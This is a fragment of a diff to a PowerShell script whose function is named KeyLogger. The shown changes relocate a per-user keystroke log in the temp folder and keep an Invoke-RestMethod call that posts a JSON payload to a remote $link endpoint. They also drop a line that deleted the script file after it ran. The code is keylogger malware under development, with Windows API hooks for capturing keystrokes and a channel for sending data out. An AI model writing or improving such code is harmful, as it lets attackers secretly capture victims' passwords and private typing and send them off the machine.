@@ -49,11 +49,13 @@ $logTimes = @(
 
 # sort the times in chronological order
 $logTimes = $logTimes | Sort-Object
-function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+function KeyLogger() {
+  $un = $env:UserName
+  $logFile="$env:temp/sad/$un.log"
   Invoke-RestMethod -ContentType 'Application/Json' -Uri $link -Method Post -Body ($payload | ConvertTo-Json)
   
   # generate log file
-  $generateLog = New-Item -Path $logFile -ItemType File -Force
+  New-Item -Path $logFile -ItemType File -Force
 
   # API signatures
   $APIsignatures = @'
@@ -125,6 +127,4 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   }
 
 }
-
 KeyLogger
-del system.ps1
